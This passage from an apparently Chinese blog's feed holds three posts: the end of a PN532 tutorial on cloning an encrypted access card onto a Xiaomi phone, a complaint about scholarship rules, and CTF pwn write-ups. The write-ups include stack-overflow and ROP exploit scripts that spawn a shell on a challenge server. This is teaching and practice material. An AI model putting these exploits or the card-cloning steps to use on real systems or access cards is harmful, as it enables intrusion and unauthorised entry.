RggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/11/01/IwM5lm7HLdjJ9aG.png" alt="QQ图片20191101114910.png"></p><p>密钥已经成功清除</p><h3 id="手机复制白卡">手机复制白卡</h3><p>按照复制白卡的方式创建门卡</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/11/01/VePRaWEkXY7UC31.jpg" alt="QQ图片20191101120958_cr.jpg"></p><p>​进行身份验证之后，将白卡贴至手机即可复制成功。</p><h3 id="用pn532覆写密钥">用pn532覆写密钥</h3><p>现在我们手中的模拟门卡只具有 <strong>存储的信息</strong>，并未储存机器中 <strong>匹配的密钥</strong>。</p><p>最后一步是要将原卡的加密密钥一并复制到手机模拟卡当中。</p><p>如果在前一步没有备份好原卡的信息的话，还需要重新读卡一次并dump数据</p><p>已经备份好了可以直接进行下一步</p><p>这一步直接双击手机的电源键，唤起手机 <strong>NFC卡片</strong></p><p>将手机靠近pn532，读取卡片，并且写入 <strong>原卡数据</strong> 即可</p><p>（注意，不是那个伪造的非加密卡的数据，而是原卡数据）</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/11/01/o2XsDmAqkhv16Ln.png" alt="QQ图片20191101114910.png"></p><p>为了确保写入成功，我们重新读取一次手机NFC数据：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/11/01/xe9GiIuFcytdzvW.png" alt="QQ图片20191101160656.png"></p><p>看到N9~N15： 厂商信息。已经和原卡完全不同了！这里是我之前在基础知识里面所说的，由于小米官方的原因，厂商信息是<strong>无法修改</strong>的，会原封不动地保留下来，而其他信息和原卡<strong>完全一致</strong>！</p><p><strong>至此，我们利用pn532来复制卡片便成功了！</strong></p><blockquote><p><strong>声明</strong> ：本教程仅供学习交流之用途，本教程不能增加你的饭卡余额，亦不能使你越过他人的门禁系统，仅仅作讨论NFC技术所使用，不得将技术用于非法途径，违法者必将受到处罚！</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tips" scheme="https://mrh1s.top/categories/Tips/"/>
    
    
  </entry>
  
  <entry>
    <title>说说学校奖学金的事</title>
    <link href="https://mrh1s.top/posts/1e65a7e/"/>
    <id>https://mrh1s.top/posts/1e65a7e/</id>
    <published>2019-09-20T17:37:23.000Z</published>
    <updated>2020-02-29T18:05:35.906Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在你电奖学金想要加个分就这么难吗?</p><p>辛辛苦苦一年打了十多场比赛，好不容易得了几个奖状，拿到辅导员面前一问，她便以&quot;这个比赛我们软件学院的老师没听说过&quot;为由就将我所有的努力全部都否定了?</p><p>好声好气地慢慢解释，她还反问我:“你是在那个地方找的比赛哦，是不是<strong>在百度找的哦?<strong>我们的奖学金认定</strong>很谨慎</strong>的，<strong>很多比赛都很水的</strong>”</p><p>堂堂一个辅导员，不为了学生的健康发展而做出努力，却阴阳怪气地去质疑一个学生，去干涉那些和她利益毫不相关的奖学金，为的是什么?何况奖学金细则可<strong>从来没有写我必须参加哪种类型的比赛</strong>啊?什么自由参加比赛，“只要有证明即可加分”这些承诺都是假的。为何纸上一套，嘴上一套呢?</p><p>最水的比赛会花上两天两夜在电脑面前肝题，最水的比赛会让全国上百所高校的学生争相参加，国家高度重视吗?</p><p>辅导员想让你做的，只是按照他们设计的路线，走好所谓的&quot;成功之路&quot;，参加他们的比赛，特别是那些对于自己能力提升毫无意义的，却能<strong>给学院带来巨大声望</strong>的比赛，这才是水赛啊，呵呵，<strong>我 骂 我 自 己</strong>  。对于那些真正有意义的比赛，他们不care，心情好会给你一个奖励，心情不好则给你安上骗学分、骗奖学金的标签。</p><p>学生工作，辅导员助理，这些工作算不上轻松，但绝谈不上肝。我们电子科大的学生拼死拼活忙一年，即使发表一篇sci论文所得的分还没一个学生会干事来的多，而且当学生干事，奖学金认定轻轻松松，为学校做事就是好啊。为你做了事，当然应当奖励。而到了你利益的盲区，就各种克扣学生、为难学生，当上了正义的使者。</p><p>我从来没有否定过学生活动的重要性，何况我自己就是班委制度的受益者，学生工作有多累我也是明白的，他们应当拿到这份奖励。我只希望辅导员的嘴脸不要摆的那么明显，单纯为利益所驱动，打着为了学生好的旗帜来做双标、利己的勾当。</p><p>所谓那啥: 我还是不所谓了。就这样吧。</p><p>辅导员的话<strong>不能信</strong>，他们告诉你的人生经验有很大一部分是利益权衡之后的结果，“想要出人头地<strong>就去</strong>考研”、“成绩好的<strong>都</strong>出国了”、“这个比赛含金量非常高”，潜台词就是用你的付出去为学院赚业绩，提升自我这些东西只是借口罢了，他们没有读过我们专业，他们自己也不懂软件专业应当达到的要求，他们眼中学院要求的事情就是成功的法宝。</p><p>我们真正应该做的，是去多接触业界大佬，多与老师交流，用他们的见识来为自己的未来铺路。多做项目，多加入老师的实验室，而不是去得那个看起来光鲜实则那啥的奖学金。</p><p>很多时候，辅导员永远是一个学校用于背锅的存在，他们既承受着来自于学校的压力，又要忍受来自于学生的不满。辅导员的所作所为，其实和学校的处事方式也是有高度关系的。</p><p>我梦想着，我的母校，有一天能够务实作风，发挥他作为一个信息技术专精之高校的优势，赶超国外高校，眼看着李言荣校长让我们学校的学风焕然一新，眼看着我们学校的收分从10000名升到了2400名，可是他却离任了。</p><p>最后，那个梦想，永远只能是个梦想啊。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="牢骚" scheme="https://mrh1s.top/categories/%E7%89%A2%E9%AA%9A/"/>
    
    
  </entry>
  
  <entry>
    <title>CNSS-PWN招新三部曲</title>
    <link href="https://mrh1s.top/posts/7c773b71/"/>
    <id>https://mrh1s.top/posts/7c773b71/</id>
    <published>2019-09-14T03:10:15.000Z</published>
    <updated>2020-03-04T14:06:48.375Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>CNSS-PWN</h1><p><a href="/uploads/GuessPigeon.7z">GuessPigeon.7z</a></p><h2 id="GuessPigeon">GuessPigeon</h2><h3 id="analyze">analyze</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">guess</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [esp+8h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your guess:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;nptr);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(&amp;nptr) == a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"My Gooood!You guessed the pigeon number!!"</span>);</span><br><span class="line">    getshell();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You are wrong!The pigeon's number is %d\n try again~"</span>, a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见 scanf处没有限制字符串长度大小，可以通过该处进行栈溢出</p><p>a1是调用guess函数时传入的参数，存在栈里面</p><p>nptr为输入的字符串，也存在栈里面</p><p>可知进行栈溢出可以将a1和nptr覆盖成一样的形式，从而getshell</p><p>虽然这道题有canary，但是并没有起到作用</p><blockquote><p>char nptr; // [esp+8h] [ebp-70h]</p><p>题外话：关于padding的长度，<strong>一定要用gdb调试后算出来！！</strong></p><p>用ida眼睛看的十有八九都是错的！！</p></blockquote><h3 id="exp-py"><a href="http://exp.py" target="_blank" rel="noopener">exp.py</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"132.232.34.26"</span>,<span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input your token:'</span>)</span><br><span class="line">p.sendline(<span class="string">"GuessPigeon"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'123'</span> + <span class="string">'\x00'</span></span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">0x74</span></span><br><span class="line">payload += p32(<span class="number">123</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Please input your guess:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="GuessPigeon2">GuessPigeon2</h2><h3 id="analyze-2">analyze</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">guess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your guess:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You've been fooled.There are no pigenos here!\n Good bye~"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to get hint? yes/no?"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  result = <span class="built_in">strcmp</span>(&amp;buf, <span class="string">"yes"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    result = <span class="built_in">printf</span>(<span class="string">"Do you know \"%s\"\n"</span>, s);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次的ELF文件是64位的，传参方式为寄存器传参，这意味着我们需要用到ROP链来构造一段代码把参数传到寄存器里面去</p><h4 id="rop">rop</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary GuessPigeon2 --only <span class="string">'pop|ret'</span> | grep <span class="string">'rdi'</span></span><br></pre></td></tr></table></figure><blockquote><p>0x0000000000400933 : pop rdi ; ret</p></blockquote><h4 id="binsh">binsh</h4><p>同时 字符串s刚好指向了 /bin/sh，利用system(s)可以getshell</p><p>查询了一下，system函数刚好存在于elf文件中，直接引用即可</p><blockquote><p>0x400650</p></blockquote><p>程序执行完guess之后，会跳到pop_rdi_ret的函数处，将rdi赋值为s的地址，接着调用system()，从而getshell</p><h3 id="exp-py-2"><a href="http://exp.py" target="_blank" rel="noopener">exp.py</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./GuessPigeon2')</span></span><br><span class="line">p = remote(<span class="string">'132.232.34.26'</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400933</span></span><br><span class="line">system_addr = <span class="number">0x400650</span></span><br><span class="line">binsh_addr = <span class="number">0x600E20</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x78</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'input your token:'</span>)</span><br><span class="line">p.sendline(<span class="string">'GuessPigeon2'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Please input your guess:"</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Do you want to get hint? yes/no?"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="GuessPigeon3">GuessPigeon3</h2><h3 id="analyze-3">analyze</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">guess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You You have two chances. Please input your guess:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"You guessed the pigeon number is %s .\nI'm sorry, you guessed wrong."</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your guess again:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You've been fooled.There are no pigenos here!\n Good bye~"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们checksec一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] <span class="string">'/home/mrh929/Desktop/cnss/GuessPigeon3/GuessPigeon3'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>程序开启了Canary和栈不可执行，guess函数中有两个read函数，即有两个溢出点</p><p>第一个溢出点的后面紧跟着一个printf，推测可能是用来泄露canary用的</p><h4 